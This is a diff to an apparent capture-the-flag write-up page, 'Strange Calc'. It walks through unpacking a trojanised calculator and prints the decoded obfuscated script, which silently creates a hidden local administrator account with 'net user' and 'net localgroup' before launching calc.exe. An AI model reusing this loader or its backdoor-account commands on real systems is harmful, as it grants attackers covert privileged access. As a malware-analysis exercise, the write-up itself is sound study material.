@@ -43,6 +43,7 @@
             border-radius: 6px;
             border: 1px solid #333;
             margin: 15px 0;
+            overflow: hidden;
         }
 
         .code-box pre {
@@ -108,7 +109,7 @@
         <h1>Strange Calc</h1>
         <p>Description: I got this new calculator app from my friend! But it’s really weird, for some reason it needs admin permissions to run??</p>
 
-        <span class="command">Using file on calc.exe: PE32 executable (GUI) Intel 80386, for MS Windows, UPX compressed, 3 sections</span>
+        <span>Using file on calc.exe give us: <span class="command">PE32 executable (GUI) Intel 80386, for MS Windows, UPX compressed, 3 sections</span></span>
 
         We can see that it is a Windows executable that was compressed using UPX. With that knowledge, we can just unpack using the following command.
         
@@ -116,7 +117,7 @@
             <pre><code>upx -d calc.exe -o unpackcalc.exe</code></pre>
         </div>
 
-        Once unpcaked, I used ghidra but saw nothing at first glance. I used the string command on the executable on can see this weird html code. 
+        <p>Once unpcaked, I used ghidra but saw nothing at first glance. I used the string command on the executable on can see this weird html code.</p> 
 
         <div class="code-box">
             <pre><code>&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;
@@ -156,7 +157,7 @@
             </code></pre>
         </div>
 
-        I discovered that AutoIt3 is a scripting language that can automate GUI commands on windows. I found AutoIt-Ripper that can extract the AutoIt file from the PE. I used <span>autoit-ripper unpackcalc.exe</span> in order to retrieve the AutoIt script that look like this:
+        <p>I discovered that AutoIt3 is a scripting language that can automate GUI commands on windows. I found AutoIt-Ripper that can extract the AutoIt file from the PE. I used <span>autoit-ripper unpackcalc.exe</span> in order to retrieve the AutoIt script that look like this:</p>
 
         <div class="code-box">
             <pre><code>; <AUT2EXE VERSION: 3.2.4.9>
@@ -223,8 +224,18 @@
                 </code></pre>
         </div>
 
-        Their is a weird base64 encoded string, using cyber chef we can convert the Local $a variable using "From Base64" and "Microsoft Script Decoder" (https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Microsoft_Script_Decoder()&input=STBCK1htTlJUVUZCUVQwOVZ5RjRYa1JyUzNoUWJXQW9ZZ2szYkM1UU1TZEZSVUpPSnlnZ0wyRldhMFJqUlMwSlNpcHBWMWN1WXpkc0xsQi9lQ0Z3SzBBaFcyTldLMVZNUkhSSkt6TlJLZ2t0YlVRc01DYzVKSDlFVWswck1sWnRiVzVqU2pjdGExRjFKeTlmWmlaTWZrVkNLbWx5TUdOWFkydFZUbjloY2paZ1JUaC9iMnRWUlNvbmVDZGFheTB3SUdKNE9TczJmVEIyUlNzSlRrVWpleWQ0VkMxMU1IdDRKM0pLSXpGSFZWbGllQ0VyU1Z4RExpeHZlR0EySUcwMGJDNHZTMDRyS1U5MklXSlBNaXNxVzM4eWFUWlhSSFpjYlM1UU5DZHhhVFJBSVZjZ1hpdDRWRTkwY0hSZmV5cGlDV0l3ZG5SUkprQXFlRFpTY3lzSlRGazBJemd1ZjJ3elNTMXRSSDVyZTJNMlVsNDBiRTFhVnprcmVrOWdOQ05TSm5rakozOHlma3g3WXpCamJYUnRMaTlYT1N0NldXTjBVWEVxVDJZZ0tpZDJNbjVXZUhZd1VsNDBiVVF2VnpsdWVsbGpORjk1STA4eUlDb25kakorY3lkMk1DQmVOR3hFTzBkT2YySlpkalJSSmlwUE1pQmlXMzltY0cxUkoxVlBSR0o0VENBMlJGZG9MelJzTGxwTFczOWdZMkpBSVVBaElDTXRZRTVBS2tBcVZ5TmlhV0l3WXpReklFQWhOaUJXZjNodlJEUlNSaXB0TXlkcVdTNXlDVzhnTUUxSE9qdDBReTQ3VjA1dVkzWmdKVnM0V0NwQUlVQWhWeU10WUROQUtrQXFlV0lqY0d0WFlEUmZaa0FoTmxKV2YxVnZSSFJQT0dKZVgzcy9SRVJ5ZUV3Z05rUkhPanMwYkUxYVIxdC9ZR0JqVmt3bVlrQWhRQ0YvS25WektqZ3BSQ3RFUlUxVlVERlNaRVVvTDA4dVluaHZkbFIrVkNNNE4wTXVVSE1uY2pSdWIzSlZMSFlxWXl4U0xRbE5NVzgxWWl3SlNrbFNabUFpTVhkZ1hVSjJkV0lzTzE1eFVpWjdNbE11VDJZd0wzWW9MRnRBSVNoakppSjZVbjhoU1g1eFMwMHRWWHduZUc1NE9VVnBOMnd1ZmdrbmJHTm9LbWt0YkUxK1N5Y3NjbmgvV1ZBaEwzOHVVR1JYWG14ZVlsdG9ZbmhyYTA5RWJWbFhUWDVGWHdsZmNsQW1iRnRiY241RmVIOVBVRjVYWGtOZWIwUkhPMkZRUTA1emNnbHJaRVJFYlZsWFRTOHNTbGN4YkhOaU9UcHlWV0l2V1UxRFdVdEVVRXBEVzA1eWZuSnRRMVplSUg4MmJrcFpTVnh0Ukg0eWUzZ3JRWDU2YlU5ck4yNXZjamhPS3pGWllFVi9WVjVFWW5kUFVsVjBibk5lUWlOd1YxZE5ZRnh0TG40N2V5RndPMEFoVnlCemYzaE1XVFJTUm5BN1VWRXFDWGNnWFNGNFkxZGROVmwrVkVJd2JWWXZmeU1wTWxJaVJWVmdTeVFyUkVKR2ZqWkRWbXNySTNBMFVrRkNRVUU5UFY0amZrQT0&oeol=NEL)
-        
+        <p>Their is a weird and very long base64 encoded string, using cyber chef we can convert the Local $a variable using "From Base64" and "Microsoft Script Decoder" (https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Microsoft_Script_Decoder()&input=STBCK1htTlJUVUZCUVQwOVZ5RjRYa1JyUzNoUWJXQW9ZZ2szYkM1UU1TZEZSVUpPSnlnZ0wyRldhMFJqUlMwSlNpcHBWMWN1WXpkc0xsQi9lQ0Z3SzBBaFcyTldLMVZNUkhSSkt6TlJLZ2t0YlVRc01DYzVKSDlFVWswck1sWnRiVzVqU2pjdGExRjFKeTlmWmlaTWZrVkNLbWx5TUdOWFkydFZUbjloY2paZ1JUaC9iMnRWUlNvbmVDZGFheTB3SUdKNE9TczJmVEIyUlNzSlRrVWpleWQ0VkMxMU1IdDRKM0pLSXpGSFZWbGllQ0VyU1Z4RExpeHZlR0EySUcwMGJDNHZTMDRyS1U5MklXSlBNaXNxVzM4eWFUWlhSSFpjYlM1UU5DZHhhVFJBSVZjZ1hpdDRWRTkwY0hSZmV5cGlDV0l3ZG5SUkprQXFlRFpTY3lzSlRGazBJemd1ZjJ3elNTMXRSSDVyZTJNMlVsNDBiRTFhVnprcmVrOWdOQ05TSm5rakozOHlma3g3WXpCamJYUnRMaTlYT1N0NldXTjBVWEVxVDJZZ0tpZDJNbjVXZUhZd1VsNDBiVVF2VnpsdWVsbGpORjk1STA4eUlDb25kakorY3lkMk1DQmVOR3hFTzBkT2YySlpkalJSSmlwUE1pQmlXMzltY0cxUkoxVlBSR0o0VENBMlJGZG9MelJzTGxwTFczOWdZMkpBSVVBaElDTXRZRTVBS2tBcVZ5TmlhV0l3WXpReklFQWhOaUJXZjNodlJEUlNSaXB0TXlkcVdTNXlDVzhnTUUxSE9qdDBReTQ3VjA1dVkzWmdKVnM0V0NwQUlVQWhWeU10WUROQUtrQXFlV0lqY0d0WFlEUmZaa0FoTmxKV2YxVnZSSFJQT0dKZVgzcy9SRVJ5ZUV3Z05rUkhPanMwYkUxYVIxdC9ZR0JqVmt3bVlrQWhRQ0YvS25WektqZ3BSQ3RFUlUxVlVERlNaRVVvTDA4dVluaHZkbFIrVkNNNE4wTXVVSE1uY2pSdWIzSlZMSFlxWXl4U0xRbE5NVzgxWWl3SlNrbFNabUFpTVhkZ1hVSjJkV0lzTzE1eFVpWjdNbE11VDJZd0wzWW9MRnRBSVNoakppSjZVbjhoU1g1eFMwMHRWWHduZUc1NE9VVnBOMnd1ZmdrbmJHTm9LbWt0YkUxK1N5Y3NjbmgvV1ZBaEwzOHVVR1JYWG14ZVlsdG9ZbmhyYTA5RWJWbFhUWDVGWHdsZmNsQW1iRnRiY241RmVIOVBVRjVYWGtOZWIwUkhPMkZRUTA1emNnbHJaRVJFYlZsWFRTOHNTbGN4YkhOaU9UcHlWV0l2V1UxRFdVdEVVRXBEVzA1eWZuSnRRMVplSUg4MmJrcFpTVnh0Ukg0eWUzZ3JRWDU2YlU5ck4yNXZjamhPS3pGWllFVi9WVjVFWW5kUFVsVjBibk5lUWlOd1YxZE5ZRnh0TG40N2V5RndPMEFoVnlCemYzaE1XVFJTUm5BN1VWRXFDWGNnWFNGNFkxZGROVmwrVkVJd2JWWXZmeU1wTWxJaVJWVmdTeVFyUkVKR2ZqWkRWbXNySTNBMFVrRkNRVUU5UFY0amZrQT0&oeol=NEL)</p>
+
+        It give us this obfuscated script: 
+        <div class="code-box">
+            <pre><code>function a(b){var c="",d=b.split("\n");for(var e=0;e<d.length;e++){var f=d[e].replace(/^\s+|\s+$/g,'');if(f.indexOf("begin")===0||f.indexOf("end")===0||f==="")continue;var g=(f.charCodeAt(0)-32)&63;for(var h=1;h<f.length;h+=4){if(h+3>=f.length)break;var i=(f.charCodeAt(h)-32)&63,j=(f.charCodeAt(h+1)-32)&63,k=(f.charCodeAt(h+2)-32)&63,l=(f.charCodeAt(h+3)-32)&63;c+=String.fromCharCode((i<<2)|(j>>4));if(h+2<f.length-1)c+=String.fromCharCode(((j&15)<<4)|(k>>2));if(h+3<f.length-1)c+=String.fromCharCode(((k&3)<<6)|l)}}return c.substring(0,g)}var m="begin 644 -\nG9FQA9WLY.3(R9F(R,6%A9C$W-3=E,V9D8C(X9#<X.3!A-60Y,WT*\n`\nend";var n=a(m);var o=["net user LocalAdministrator "+n+" /add","net localgroup administrators LocalAdministrator /add","calc.exe"];var p=new ActiveXObject('WScript.Shell');for(var q=0;q<o.length-1;q++){p.Run(o[q],0,false)}p.Run(o[2],1,false);</code></pre>
+        </div>
+
+        The script tries to create a new local administratator, the password of that admnistrator is an UUEncoded string. Once decrypted it give use the flag.
+
+        <div class="image-box">
+            <img src="../assets/images/calcSolveUUEncodedString.png" alt="Flag">
+        </div>
 
     </div>
 </body>
